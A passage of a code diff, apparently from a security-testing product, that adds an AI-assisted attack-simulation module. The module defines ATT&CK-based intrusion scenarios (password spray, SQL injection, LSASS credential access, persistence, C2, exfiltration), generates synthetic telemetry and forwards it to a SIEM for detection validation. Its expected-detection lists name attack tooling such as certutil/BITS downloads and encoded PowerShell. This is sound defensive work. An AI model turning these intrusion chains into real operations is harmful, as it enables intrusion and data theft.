@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import asyncio
 import base64
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
@@ -10,6 +11,7 @@ import json
 import logging
 import os
 from pathlib import Path
+import random
 import re
 import select
 import socket
@@ -21,6 +23,7 @@ from urllib.error import HTTPError, URLError
 from uuid import uuid4
 
 from app.core.config import settings
+from app.services.ai.factory import get_adapter
 from app.services.atomic_event_catalog import (
     ATOMIC_EVENT_CATEGORIES,
     ATOMIC_EVENT_SIMULATION_IDS,
@@ -31,6 +34,13 @@ from app.services.atomic_event_catalog import (
 
 
 logger = logging.getLogger(__name__)
+_DETECTION_BRIEFS_PATH = Path(__file__).with_name("attack_simulation_detection_briefs.json")
+try:
+    DETECTION_BRIEFS: dict[str, dict[str, Any]] = json.loads(_DETECTION_BRIEFS_PATH.read_text())
+except Exception as exc:  # pragma: no cover - defensive fallback for packaged deployments
+    logger.warning("Attack simulation detection briefs unavailable: %s", exc)
+    DETECTION_BRIEFS = {}
+
 _LAB_WEB_SERVER: ThreadingHTTPServer | None = None
 _LAB_WEB_SERVER_LOCK = threading.Lock()
 _LAB_WEB_HOST = "127.0.0.1"
@@ -40,6 +50,7 @@ _DEFAULT_ATTACK_LAB_WEB_URL = _LAB_WEB_BASE_URL
 _ATTACK_LAB_WEB_URL = os.environ.get("ATTACK_LAB_WEB_URL", _DEFAULT_ATTACK_LAB_WEB_URL).rstrip("/")
 _DEFAULT_ATTACK_LAB_ENDPOINT_URL = _LAB_WEB_BASE_URL
 _ATTACK_LAB_ENDPOINT_URL = os.environ.get("ATTACK_LAB_ENDPOINT_URL", _DEFAULT_ATTACK_LAB_ENDPOINT_URL).rstrip("/")
+_AI_ATTACK_PLANNER_TIMEOUT_SECONDS = float(os.environ.get("AI_ATTACK_PLANNER_TIMEOUT_SECONDS", "12"))
 _RUN_ID_RE = re.compile(r"^run-[a-f0-9-]{36}$")
 _LOOPBACK_BRIDGES: set[int] = set()
 _LOOPBACK_BRIDGES_LOCK = threading.Lock()
@@ -1280,6 +1291,7 @@ def is_allowed(simulation: Simulation, target: Target) -> tuple[bool, list[str]]
 
 
 def _simulation_dict(item: Simulation) -> dict:
+    detection_brief = DETECTION_BRIEFS.get(item.id) or None
     return {
         "id": item.id,
         "technique_id": item.technique_id,
@@ -1287,7 +1299,8 @@ def _simulation_dict(item: Simulation) -> dict:
         "category": item.category,
         "risk_level": item.risk_level,
         "target_types": item.target_types,
-        "description": item.description,
+        "description": (detection_brief or {}).get("adversary_activity") or item.description,
+        "detection_brief": detection_brief,
         "expected_telemetry": item.expected_telemetry,
         "safety_controls": item.safety_controls,
         "steps": item.steps,
@@ -2223,6 +2236,1249 @@ def forward_telemetry_logs(
     return result
 
 
+ASSISTANT_ACTOR_TTPS: dict[str, list[str]] = {
+    "apt29": ["T1078", "T1059.001", "T1082", "T1105", "T1003.001", "T1041"],
+    "fin7": ["T1190", "T1059.001", "T1110.001", "T1105", "T1053.005", "T1003.001"],
+    "lazarus": ["T1566.001", "T1204.002", "T1059.003", "T1105", "T1547.001", "T1041"],
+    "generic-intrusion": ["T1595", "T1190", "T1110", "T1078", "T1059.001", "T1003.001", "T1105"],
+}
+
+ASSISTANT_COMPLICATED_CHALLENGE_TTPS = [
+    "T1595",
+    "T1190",
+    "T1589.002",
+    "T1110.001",
+    "T1078",
+    "T1059.001",
+    "T1105",
+    "T1218.011",
+    "T1046",
+    "T1071.004",
+    "T1071.001",
+    "T1003.001",
+    "T1547.001",
+    "T1053.005",
+    "T1041",
+    "T1567.002",
+]
+
+ASSISTANT_SCENARIOS: list[dict[str, Any]] = [
+    {
+        "id": "web-to-endpoint-intrusion",
+        "name": "Web App to Endpoint Compromise",
+        "difficulty": "full_intrusion",
+        "description": "A plausible external web intrusion that progresses from public reconnaissance to web exploit attempts, identity attack, valid account foothold, endpoint execution, C2, credential access, persistence, and exfiltration.",
+        "technique_ids": ASSISTANT_COMPLICATED_CHALLENGE_TTPS,
+        "preconditions": [
+            "Approved lab web target is selected.",
+            "Endpoint, Windows Security, Sysmon, web, WAF, DNS, firewall, and proxy telemetry parsers are enabled in the SIEM.",
+            "SIEM destination is configured and reachable.",
+        ],
+        "success_criteria": [
+            "SIEM receives all scenario events with one run_id.",
+            "Rules detect web exploitation, password attack, valid-account success, endpoint execution, C2, credential access, persistence, and exfiltration phases.",
+            "Correlation links at least three telemetry sources to the same source host/user timeline.",
+        ],
+        "telemetry_sources": ["nginx", "waf", "application_auth", "windows_security", "sysmon", "firewall", "dns", "edr", "proxy"],
+        "expected_detections": [
+            "High-volume reconnaissance and public-app exploit canaries.",
+            "Username enumeration and password spraying with failure-to-success transition.",
+            "Suspicious PowerShell, ingress transfer, and signed binary proxy execution.",
+            "Internal port sweep, DNS/TLS C2, LSASS access, persistence, and outbound exfiltration.",
+        ],
+        "tags": ["web", "identity", "endpoint", "c2", "exfiltration", "persistence"],
+    },
+    {
+        "id": "identity-spray-to-foothold",
+        "name": "Password Spray to Valid Account Foothold",
+        "difficulty": "simple_chain",
+        "description": "External username enumeration and password spraying followed by a valid-account login and endpoint discovery.",
+        "technique_ids": ["T1589.002", "T1110.001", "T1078", "T1059.001", "T1046"],
+        "preconditions": ["Auth telemetry is parsed.", "Windows Security 4624/4625 events are collected.", "Endpoint/Sysmon telemetry is available."],
+        "success_criteria": ["Detect many-account failure pattern.", "Detect success after failures.", "Correlate the authenticated host to follow-on discovery."],
+        "telemetry_sources": ["application_auth", "windows_security", "sysmon", "firewall"],
+        "expected_detections": ["User enumeration", "Password spray", "Valid account success", "Post-login discovery"],
+        "tags": ["identity", "endpoint"],
+    },
+    {
+        "id": "sql-injection-to-data-theft",
+        "name": "SQL Injection to Data Theft",
+        "difficulty": "full_intrusion",
+        "description": "Public web exploit attempts produce WAF and web telemetry, followed by C2, transfer, and exfiltration-shaped events.",
+        "technique_ids": ["T1595", "T1190", "T1105", "T1071.004", "T1071.001", "T1041", "T1567.002"],
+        "preconditions": ["Web/WAF logs are parsed.", "DNS/proxy telemetry is available.", "SIEM can correlate by source IP and run_id."],
+        "success_criteria": ["Detect SQLi/XSS/path traversal canaries.", "Detect outbound staging and exfiltration.", "Correlate exploit source to later outbound events."],
+        "telemetry_sources": ["nginx", "waf", "dns", "edr", "proxy"],
+        "expected_detections": ["Web exploit burst", "Tool transfer", "Suspicious DNS", "Large outbound upload"],
+        "tags": ["web", "c2", "exfiltration"],
+    },
+    {
+        "id": "recon-to-webshell-persistence",
+        "name": "Recon to Web Shell Persistence",
+        "difficulty": "full_intrusion",
+        "description": "External path discovery leads to public-app exploit canaries, tool transfer, signed-binary execution, and persistence.",
+        "technique_ids": ["T1595", "T1190", "T1105", "T1218.011", "T1547.001", "T1053.005"],
+        "preconditions": ["Web and WAF logs are parsed.", "Sysmon process and registry events are collected.", "Scheduled task events are collected."],
+        "success_criteria": ["Detect sensitive path enumeration.", "Detect exploit-shaped upload/command attempts.", "Detect follow-on persistence activity."],
+        "telemetry_sources": ["nginx", "waf", "sysmon", "windows_security"],
+        "expected_detections": ["Recon path burst", "Suspicious web extension upload", "Ingress transfer", "Run key and scheduled task persistence"],
+        "tags": ["web", "endpoint", "persistence"],
+    },
+    {
+        "id": "valid-account-to-lsass",
+        "name": "Valid Account to LSASS Access",
+        "difficulty": "simple_chain",
+        "description": "A valid account foothold progresses to command execution, internal discovery, and credential-access telemetry.",
+        "technique_ids": ["T1078", "T1059.001", "T1046", "T1003.001"],
+        "preconditions": ["Windows Security 4624 parsing is enabled.", "Sysmon process/access events are collected.", "Firewall traffic logs are available."],
+        "success_criteria": ["Detect unusual valid-account logon.", "Detect post-logon discovery.", "Detect LSASS access by suspicious process."],
+        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
+        "expected_detections": ["Valid account anomaly", "PowerShell discovery", "Internal sweep", "LSASS access"],
+        "tags": ["identity", "credential-access", "endpoint"],
+    },
+    {
+        "id": "password-spray-to-exfiltration",
+        "name": "Password Spray to Exfiltration",
+        "difficulty": "full_intrusion",
+        "description": "Password spraying succeeds against a service account, followed by execution, transfer, C2, and outbound upload.",
+        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1105", "T1071.004", "T1071.001", "T1041"],
+        "preconditions": ["Windows auth events are collected.", "Endpoint and network telemetry are parsed.", "Proxy logs include bytes_out."],
+        "success_criteria": ["Detect failure-to-success transition.", "Detect suspicious execution after logon.", "Detect C2 and large outbound transfer."],
+        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
+        "expected_detections": ["Password spray", "Valid account success", "Ingress transfer", "DNS/TLS C2", "Large upload"],
+        "tags": ["identity", "c2", "exfiltration"],
+    },
+    {
+        "id": "xss-to-session-abuse",
+        "name": "XSS Canary to Session Abuse",
+        "difficulty": "simple_chain",
+        "description": "Web exploit canaries are followed by valid-account use and endpoint discovery, modelling session or credential abuse without executing browser code.",
+        "technique_ids": ["T1190", "T1078", "T1059.001", "T1046"],
+        "preconditions": ["WAF/web logs are parsed.", "Windows Security events are available.", "Endpoint process telemetry is available."],
+        "success_criteria": ["Detect XSS-shaped requests.", "Detect unusual valid-account logon.", "Detect discovery after the web event cluster."],
+        "telemetry_sources": ["waf", "windows_security", "sysmon", "firewall"],
+        "expected_detections": ["XSS canary", "Valid-account use", "Command execution", "Internal discovery"],
+        "tags": ["web", "identity", "endpoint"],
+    },
+    {
+        "id": "ssrf-metadata-to-c2",
+        "name": "SSRF Metadata Probe to C2",
+        "difficulty": "full_intrusion",
+        "description": "SSRF-shaped web probes are correlated with ingress transfer, DNS resolution, and outbound C2 telemetry.",
+        "technique_ids": ["T1595", "T1190", "T1105", "T1071.004", "T1071.001"],
+        "preconditions": ["WAF canary classifications are parsed.", "DNS logs are available.", "EDR network events are collected."],
+        "success_criteria": ["Detect metadata-service probe.", "Detect staging transfer.", "Detect suspicious DNS and outbound TLS from the staged process."],
+        "telemetry_sources": ["nginx", "waf", "sysmon", "dns", "edr"],
+        "expected_detections": ["SSRF metadata canary", "Ingress transfer", "Beacon DNS", "Outbound network connection"],
+        "tags": ["web", "cloud-adjacent", "c2"],
+    },
+    {
+        "id": "ransomware-precursor",
+        "name": "Ransomware Precursor Chain",
+        "difficulty": "full_intrusion",
+        "description": "Credential access and persistence signals are staged after initial foothold, with exfiltration-like traffic before impact.",
+        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1003.001", "T1547.001", "T1053.005", "T1041"],
+        "preconditions": ["Auth, Sysmon, and proxy logs are parsed.", "Credential-access and persistence detections are enabled.", "Run correlation is enabled."],
+        "success_criteria": ["Detect account compromise.", "Detect credential dumping and persistence.", "Detect pre-impact outbound data movement."],
+        "telemetry_sources": ["windows_security", "sysmon", "proxy"],
+        "expected_detections": ["Password spray success", "LSASS access", "Run key", "Scheduled task", "Outbound upload"],
+        "tags": ["ransomware", "credential-access", "persistence", "exfiltration"],
+    },
+    {
+        "id": "living-off-the-land-transfer",
+        "name": "Living-off-the-Land Transfer and Execution",
+        "difficulty": "simple_chain",
+        "description": "Native Windows utilities perform staging and execution, followed by suspicious outbound network activity.",
+        "technique_ids": ["T1059.001", "T1105", "T1218.011", "T1071.001"],
+        "preconditions": ["Sysmon process-create events are collected.", "EDR network connection telemetry is parsed.", "Command-line fields are searchable."],
+        "success_criteria": ["Detect encoded PowerShell.", "Detect certutil/BITS transfer.", "Detect signed binary proxy execution and outbound connection."],
+        "telemetry_sources": ["sysmon", "edr"],
+        "expected_detections": ["Encoded PowerShell", "Certutil/BITS download", "Rundll32/mshtml", "Beacon network connection"],
+        "tags": ["endpoint", "lolbin", "c2"],
+    },
+    {
+        "id": "internal-discovery-after-foothold",
+        "name": "Internal Discovery After Foothold",
+        "difficulty": "simple_chain",
+        "description": "A valid account foothold performs local command discovery and then scans internal ports.",
+        "technique_ids": ["T1078", "T1059.001", "T1046"],
+        "preconditions": ["Successful logon events are collected.", "Command execution telemetry is available.", "Firewall/traffic logs are parsed."],
+        "success_criteria": ["Detect unusual logon.", "Detect host/network discovery commands.", "Detect many destination ports from one source."],
+        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
+        "expected_detections": ["4624 unusual source", "Discovery command chain", "Internal port sweep"],
+        "tags": ["identity", "discovery"],
+    },
+    {
+        "id": "web-enumeration-to-password-spray",
+        "name": "Web Enumeration to Password Spray",
+        "difficulty": "simple_chain",
+        "description": "Public username enumeration is followed by password spraying and a success event.",
+        "technique_ids": ["T1589.002", "T1110.001", "T1078"],
+        "preconditions": ["Application auth telemetry is parsed.", "Windows auth events are parsed.", "User fields are normalized or searchable."],
+        "success_criteria": ["Detect username response differential.", "Detect many failed logons from one source.", "Detect success after failures."],
+        "telemetry_sources": ["application_auth", "windows_security"],
+        "expected_detections": ["User enumeration", "4625 burst", "4624 after failures"],
+        "tags": ["identity", "web"],
+    },
+    {
+        "id": "public-app-to-persistence",
+        "name": "Public App Exploit to Persistence",
+        "difficulty": "full_intrusion",
+        "description": "Public-app exploitation is followed by execution, transfer, and two persistence mechanisms.",
+        "technique_ids": ["T1190", "T1059.001", "T1105", "T1547.001", "T1053.005"],
+        "preconditions": ["WAF logs are parsed.", "Sysmon process/registry events are collected.", "Windows task creation events are available."],
+        "success_criteria": ["Detect exploit-shaped web request.", "Detect staged payload transfer.", "Detect both persistence mechanisms."],
+        "telemetry_sources": ["waf", "sysmon", "windows_security"],
+        "expected_detections": ["WAF canary", "PowerShell download cradle", "Run key", "Scheduled task"],
+        "tags": ["web", "endpoint", "persistence"],
+    },
+    {
+        "id": "credential-dump-to-cloud-upload",
+        "name": "Credential Dump to Cloud Upload",
+        "difficulty": "full_intrusion",
+        "description": "Endpoint execution leads to LSASS access, DNS/C2, and upload to an external file service.",
+        "technique_ids": ["T1059.001", "T1003.001", "T1071.004", "T1071.001", "T1567.002"],
+        "preconditions": ["Sysmon process/access events are collected.", "DNS and EDR network events are parsed.", "Proxy upload fields are available."],
+        "success_criteria": ["Detect LSASS access.", "Detect suspicious DNS/outbound C2.", "Detect cloud-service upload after credential access."],
+        "telemetry_sources": ["sysmon", "dns", "edr", "proxy"],
+        "expected_detections": ["Credential dumping", "Beacon DNS", "Outbound C2", "Cloud upload"],
+        "tags": ["credential-access", "c2", "exfiltration"],
+    },
+    {
+        "id": "defense-evasion-to-c2",
+        "name": "Signed Binary Proxy to C2",
+        "difficulty": "simple_chain",
+        "description": "Signed binary proxy execution is followed by DNS and outbound C2 connection telemetry.",
+        "technique_ids": ["T1218.011", "T1071.004", "T1071.001"],
+        "preconditions": ["Sysmon process-create is collected.", "DNS telemetry is collected.", "EDR network events are parsed."],
+        "success_criteria": ["Detect rundll32/mshtml pattern.", "Detect rare DNS lookups.", "Detect outbound connection from staged process."],
+        "telemetry_sources": ["sysmon", "dns", "edr"],
+        "expected_detections": ["Signed binary proxy execution", "Suspicious DNS", "Outbound TLS"],
+        "tags": ["defense-evasion", "c2"],
+    },
+    {
+        "id": "fin7-style-web-identity-persistence",
+        "name": "FIN7-Style Web, Identity, Persistence",
+        "difficulty": "full_intrusion",
+        "description": "A web and credential-driven intrusion chain with persistence and credential-access telemetry.",
+        "technique_ids": ["T1190", "T1110.001", "T1078", "T1059.001", "T1105", "T1053.005", "T1003.001"],
+        "preconditions": ["WAF, Windows Security, and Sysmon events are available.", "Scheduled task detections are enabled.", "SIEM can correlate by run_id."],
+        "success_criteria": ["Detect public exploit canaries.", "Detect credential attack and valid-account success.", "Detect persistence and LSASS access."],
+        "telemetry_sources": ["waf", "windows_security", "sysmon"],
+        "expected_detections": ["Web exploit", "Password spray", "Valid account", "Scheduled task", "LSASS access"],
+        "tags": ["fin7-style", "web", "identity", "persistence"],
+    },
+    {
+        "id": "apt29-style-identity-powershell",
+        "name": "APT29-Style Identity and PowerShell",
+        "difficulty": "full_intrusion",
+        "description": "Identity foothold followed by PowerShell execution, ingress transfer, DNS C2, and exfiltration-shaped proxy telemetry.",
+        "technique_ids": ["T1078", "T1059.001", "T1105", "T1071.004", "T1071.001", "T1041"],
+        "preconditions": ["Windows Security events are parsed.", "PowerShell/Sysmon process events are available.", "DNS/EDR/proxy logs are parsed."],
+        "success_criteria": ["Detect valid-account foothold.", "Detect PowerShell staging.", "Detect C2 and exfiltration sequence."],
+        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
+        "expected_detections": ["Valid account", "PowerShell execution", "Ingress transfer", "DNS/TLS C2", "Outbound upload"],
+        "tags": ["apt29-style", "identity", "powershell", "exfiltration"],
+    },
+    {
+        "id": "lazarus-style-delivery-exfil",
+        "name": "Lazarus-Style Delivery and Exfiltration",
+        "difficulty": "full_intrusion",
+        "description": "Execution and staging activity followed by persistence, C2, and exfiltration-shaped telemetry.",
+        "technique_ids": ["T1059.001", "T1105", "T1218.011", "T1547.001", "T1071.004", "T1071.001", "T1041"],
+        "preconditions": ["Sysmon process and registry telemetry is collected.", "DNS/EDR/proxy logs are parsed.", "Correlation by host and run_id is enabled."],
+        "success_criteria": ["Detect execution and staging.", "Detect persistence.", "Detect C2 and outbound upload."],
+        "telemetry_sources": ["sysmon", "dns", "edr", "proxy"],
+        "expected_detections": ["PowerShell execution", "Ingress transfer", "Rundll32 proxy execution", "Run key", "C2", "Exfiltration"],
+        "tags": ["lazarus-style", "endpoint", "persistence", "exfiltration"],
+    },
+    {
+        "id": "noisy-red-team-drill",
+        "name": "Noisy Red-Team Drill",
+        "difficulty": "noisy_red_team_drill",
+        "description": "A broad, noisy validation run that touches web, auth, endpoint, network, C2, credential access, persistence, and exfiltration controls.",
+        "technique_ids": ASSISTANT_COMPLICATED_CHALLENGE_TTPS,
+        "preconditions": ["All major telemetry sources are enabled.", "SIEM ingestion rate can handle burst delivery.", "Rules are enabled but tuned for lab run_id correlation."],
+        "success_criteria": ["Detect every major phase.", "Do not collapse all alerts into one undifferentiated incident.", "Preserve raw vendor/source fields for each event family."],
+        "telemetry_sources": ["nginx", "waf", "application_auth", "windows_security", "sysmon", "firewall", "dns", "edr", "proxy"],
+        "expected_detections": ["Recon", "Exploit", "Credential attack", "Execution", "Discovery", "C2", "Credential access", "Persistence", "Exfiltration"],
+        "tags": ["full-chain", "noisy", "validation"],
+    },
+    {
+        "id": "stealthy-low-volume-chain",
+        "name": "Stealthy Low-Volume Intrusion Chain",
+        "difficulty": "full_intrusion",
+        "description": "A lower-volume chain focused on correlation quality rather than event volume: valid account, execution, DNS C2, credential access, and exfiltration.",
+        "technique_ids": ["T1078", "T1059.001", "T1071.004", "T1071.001", "T1003.001", "T1567.002"],
+        "preconditions": ["Identity, endpoint, DNS, EDR, and proxy telemetry is available.", "Correlation rules are not dependent on high event volume only."],
+        "success_criteria": ["Detect suspicious sequence with few events.", "Correlate identity and endpoint activity.", "Detect exfiltration after credential access."],
+        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
+        "expected_detections": ["Valid account", "Execution", "DNS C2", "Credential access", "Cloud upload"],
+        "tags": ["stealthy", "correlation", "exfiltration"],
+    },
+    {
+        "id": "waf-bypass-retry-chain",
+        "name": "WAF Bypass Retry Chain",
+        "difficulty": "simple_chain",
+        "description": "Repeated encoded public-app exploit attempts are followed by staging and outbound communication signals.",
+        "technique_ids": ["T1595", "T1190", "T1105", "T1071.001"],
+        "preconditions": ["Web and WAF logs preserve encoded URI fields.", "Endpoint process and EDR network events are collected."],
+        "success_criteria": ["Detect encoded exploit retries.", "Detect transition from web activity to host staging.", "Detect outbound connection from staged tool."],
+        "telemetry_sources": ["nginx", "waf", "sysmon", "edr"],
+        "expected_detections": ["Double-encoded SQLi retry", "WAF canary", "Ingress transfer", "Outbound network connection"],
+        "tags": ["web", "waf", "c2"],
+    },
+    {
+        "id": "service-account-abuse",
+        "name": "Service Account Abuse",
+        "difficulty": "simple_chain",
+        "description": "Password attack activity succeeds against a service account and is followed by execution, discovery, and persistence.",
+        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1046", "T1547.001"],
+        "preconditions": ["Service-account logons are visible.", "Sysmon and firewall logs are parsed.", "Service-account baselines exist."],
+        "success_criteria": ["Detect service account failure-to-success.", "Detect interactive-like activity from service account.", "Detect persistence after service account use."],
+        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
+        "expected_detections": ["4625/4624 service account sequence", "PowerShell discovery", "Internal sweep", "Run key persistence"],
+        "tags": ["identity", "service-account", "persistence"],
+    },
+    {
+        "id": "external-recon-to-credential-access",
+        "name": "External Recon to Credential Access",
+        "difficulty": "full_intrusion",
+        "description": "External recon and public exploit attempts are correlated to endpoint execution and credential-access telemetry.",
+        "technique_ids": ["T1595", "T1190", "T1059.001", "T1105", "T1003.001"],
+        "preconditions": ["Web/WAF and endpoint telemetry are available.", "SIEM can correlate scenario run_id across source families."],
+        "success_criteria": ["Detect recon and exploit canaries.", "Detect staging and command execution.", "Detect LSASS access."],
+        "telemetry_sources": ["nginx", "waf", "sysmon"],
+        "expected_detections": ["Recon burst", "Exploit canary", "PowerShell execution", "Ingress transfer", "Credential dumping"],
+        "tags": ["web", "endpoint", "credential-access"],
+    },
+    {
+        "id": "c2-only-validation",
+        "name": "C2 Telemetry Validation",
+        "difficulty": "atomic_chain",
+        "description": "A compact C2-focused run for validating DNS and outbound network detections without a full intrusion story.",
+        "technique_ids": ["T1071.004", "T1071.001"],
+        "preconditions": ["DNS logs are collected.", "EDR network telemetry is parsed.", "Destination rarity detections are enabled."],
+        "success_criteria": ["Detect suspicious DNS queries.", "Detect outbound connection from suspicious process.", "Correlate DNS and network event by host/time."],
+        "telemetry_sources": ["dns", "edr"],
+        "expected_detections": ["Beacon-like DNS", "Outbound TLS from staged binary"],
+        "tags": ["c2", "atomic-chain"],
+    },
+    {
+        "id": "persistence-validation",
+        "name": "Persistence Control Validation",
+        "difficulty": "atomic_chain",
+        "description": "A compact persistence-focused run for validating Run key and scheduled-task detections.",
+        "technique_ids": ["T1547.001", "T1053.005"],
+        "preconditions": ["Sysmon registry events are collected.", "Windows scheduled task events are collected.", "Persistence rules are enabled."],
+        "success_criteria": ["Detect Run key creation.", "Detect scheduled task creation.", "Preserve user, host, target object, and task content fields."],
+        "telemetry_sources": ["sysmon", "windows_security"],
+        "expected_detections": ["Run key persistence", "Suspicious scheduled task"],
+        "tags": ["persistence", "atomic-chain"],
+    },
+]
+
+
+async def run_ai_assistant_telemetry_simulation(
+    mode: str,
+    ai_provider: str,
+    complicated_attack: bool,
+    technique_ids: list[str],
+    actor_profile: str,
+    analyst_goal: str,
+    destination_url: str,
+    auth_type: str = "none",
+    username: str = "",
+    password: str = "",
+    token: str = "",
+    header_name: str = "",
+    connection_mode: str = "auto",
+    allow_http_fallback: bool = True,
+    payload_format: str = "per_event",
+    scenario_id: str = "",
+) -> dict[str, Any]:
+    if mode not in {"ttps", "actor", "challenge"}:
+        raise ValueError("Unknown AI assistant mode")
+    if ai_provider not in {"local", "claude", "openai", "gemini", "minimax"}:
+        raise ValueError("Unknown AI provider")
+    scenario = _assistant_scenario_by_id(scenario_id)
+    selected = list(scenario["technique_ids"]) if scenario else _assistant_selected_ttps(mode, technique_ids, actor_profile, analyst_goal, complicated_attack)
+    ai_plan = await _assistant_llm_plan(
+        provider=ai_provider,
+        mode=mode,
+        complicated_attack=complicated_attack,
+        initial_technique_ids=selected,
+        actor_profile=actor_profile,
+        analyst_goal=_assistant_goal_with_scenario(analyst_goal, scenario),
+    )
+    if ai_plan.get("technique_ids") and not scenario:
+        planned = [item for item in ai_plan["technique_ids"] if re.match(r"^T\d{4}(?:\.\d{3})?$", item)]
+        if complicated_attack and mode == "challenge":
+            selected = _assistant_coherent_complicated_chain(planned)
+        else:
+            selected = planned[:18] or selected
+    run_id = f"run-{uuid4()}"
+    events: list[dict[str, Any]] = []
+    for ttp in selected:
+        templates = _assistant_complicated_templates_for_ttp(ttp) if complicated_attack else _assistant_templates_for_ttp(ttp)
+        for template in templates:
+            events.append(_assistant_event_for_ttp(ttp, run_id, len(events) + 1, mode, actor_profile, analyst_goal, template, ai_provider, complicated_attack))
+    attack_plan = _assistant_attack_plan(events, mode, actor_profile, analyst_goal, ai_provider, complicated_attack)
+    for event in events:
+        _append_jsonl(_endpoint_jsonl_path(), event)
+        _append_text_line(_endpoint_log_path(), event["raw_line"])
+        _append_jsonl(_attack_log_path(run_id), event)
+    summary = {
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "event_type": "ai_assistant_attack_summary",
+        "run_id": run_id,
+        "simulation_id": "ai-assistant-attack-simulation",
+        "ai_provider": ai_provider,
+        "complicated_attack": complicated_attack,
+        "technique_ids": selected,
+        "message": attack_plan["summary"],
+        "scenario_id": scenario["id"] if scenario else "",
+        "events_generated": len(events),
+    }
+    _append_jsonl(_attack_log_path(run_id), summary)
+    logs = {
+        "source": "endpoint",
+        "run_id": run_id,
+        "log_file": str(_endpoint_log_path()),
+        "line_count": len(events),
+        "events": events,
+        "returned_at": datetime.now(timezone.utc).isoformat(),
+    }
+    destination = _validate_siem_destination(destination_url, connection_mode=connection_mode)
+    headers = {
+        "Content-Type": "text/plain; charset=utf-8" if (complicated_attack or payload_format == "raw_lines") else "application/json",
+        "User-Agent": "AdversaryGraph-AI-AttackAssistant/1.0",
+        "X-AdversaryGraph-Module": "attack-simulation-ai-assistant",
+        "X-AdversaryGraph-Run-Id": run_id,
+        "X-Xpolog-Sender": "adversarygraph-ai-attack-assistant",
+    }
+    headers.update(_siem_auth_headers(auth_type, username=username, password=password, token=token, header_name=header_name))
+    started = time.perf_counter()
+    if payload_format not in {"raw_lines", "per_event", "json_lines", "envelope"}:
+        raise ValueError("Unsupported SIEM payload format")
+    effective_payload_format = "raw_lines" if complicated_attack else payload_format
+    if effective_payload_format in {"raw_lines", "per_event"}:
+        delivery = _forward_siem_events_individually(
+            destination=destination,
+            logs=logs,
+            headers=headers,
+            started=started,
+            original_destination=destination_url,
+            connection_mode=connection_mode,
+            allow_http_fallback=allow_http_fallback,
+            payload_format=effective_payload_format,
+        )
+    else:
+        body = _siem_payload_body(logs, effective_payload_format)
+        delivery, fallback_note = _post_siem_payload(
+            destination=destination,
+            body=body,
+            headers=headers,
+            started=started,
+            original_destination=destination_url,
+            connection_mode=connection_mode,
+            allow_http_fallback=allow_http_fallback,
+        )
+        delivery.update(
+            {
+                "source": "endpoint",
+                "run_id": run_id,
+                "event_count": len(events),
+                "duration_ms": round((time.perf_counter() - started) * 1000, 3),
+                "http_fallback_used": bool(fallback_note),
+                "fallback_note": fallback_note,
+                "payload_format": effective_payload_format,
+                "sent_event_count": len(events) if delivery.get("ok") else 0,
+            }
+        )
+    return {
+        "run_id": run_id,
+        "mode": mode,
+        "ai_provider": ai_provider,
+        "ai_model": ai_plan.get("model", ""),
+        "ai_used": bool(ai_plan.get("used")),
+        "ai_error": str(ai_plan.get("error") or ""),
+        "ai_planner_summary": str(ai_plan.get("summary") or ""),
+        "scenario": scenario,
+        "complicated_attack": complicated_attack,
+        "actor_profile": actor_profile,
+        "technique_ids": selected,
+        "attack_plan": attack_plan,
+        "events": events,
+        "delivery": delivery,
+        "log_file": str(_endpoint_log_path()),
+    }
+
+
+def _assistant_selected_ttps(mode: str, technique_ids: list[str], actor_profile: str, analyst_goal: str, complicated_attack: bool = False) -> list[str]:
+    cleaned = []
+    for item in technique_ids:
+        value = item.strip().upper()
+        if value and re.match(r"^T\d{4}(?:\.\d{3})?$", value) and value not in cleaned:
+            cleaned.append(value)
+    if mode == "ttps" and cleaned:
+        return cleaned[:12]
+    if mode == "actor":
+        return ASSISTANT_ACTOR_TTPS.get(actor_profile, ASSISTANT_ACTOR_TTPS["generic-intrusion"])
+    if mode == "challenge" and complicated_attack:
+        return list(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
+    if "complicated" in analyst_goal.lower() or "multi-source" in analyst_goal.lower() or "many" in analyst_goal.lower():
+        return list(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
+    seed = hashlib.sha256(f"{actor_profile}|{analyst_goal}|{datetime.now(timezone.utc).date()}".encode("utf-8")).hexdigest()
+    rng = random.Random(seed)
+    pool = ["T1595", "T1190", "T1110.001", "T1078", "T1059.001", "T1105", "T1003.001", "T1547.001", "T1053.005", "T1218.011", "T1041", "T1567.002"]
+    rng.shuffle(pool)
+    return pool[: rng.randint(6, 9)]
+
+
+def _assistant_coherent_complicated_chain(planned: list[str]) -> list[str]:
+    """Keep complicated challenge output as a plausible ordered kill chain.
+
+    The LLM may suggest extra ATT&CK IDs, but the simulator must not become a
+    random bag of phases. Known phases are ordered by the validated scenario;
+    unsupported extras are ignored because there is no source-realistic event
+    template for them yet.
+    """
+    allowed = set(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
+    merged = [item for item in ASSISTANT_COMPLICATED_CHALLENGE_TTPS]
+    for item in planned:
+        if item in allowed and item not in merged:
+            merged.append(item)
+    return merged
+
+
+def list_ai_assistant_scenarios() -> list[dict[str, Any]]:
+    return [dict(item) for item in ASSISTANT_SCENARIOS]
+
+
+def _assistant_scenario_by_id(scenario_id: str) -> dict[str, Any] | None:
+    if not scenario_id:
+        return None
+    for item in ASSISTANT_SCENARIOS:
+        if item["id"] == scenario_id:
+            return dict(item)
+    raise ValueError("Unknown AI assistant scenario")
+
+
+def _assistant_goal_with_scenario(analyst_goal: str, scenario: dict[str, Any] | None) -> str:
+    if not scenario:
+        return analyst_goal
+    return (
+        f"Scenario: {scenario['name']}. {scenario['description']} "
+        f"Preconditions: {'; '.join(scenario['preconditions'])}. "
+        f"Success criteria: {'; '.join(scenario['success_criteria'])}. "
+        f"Analyst goal: {analyst_goal}"
+    )
+
+
+async def _assistant_llm_plan(
+    provider: str,
+    mode: str,
+    complicated_attack: bool,
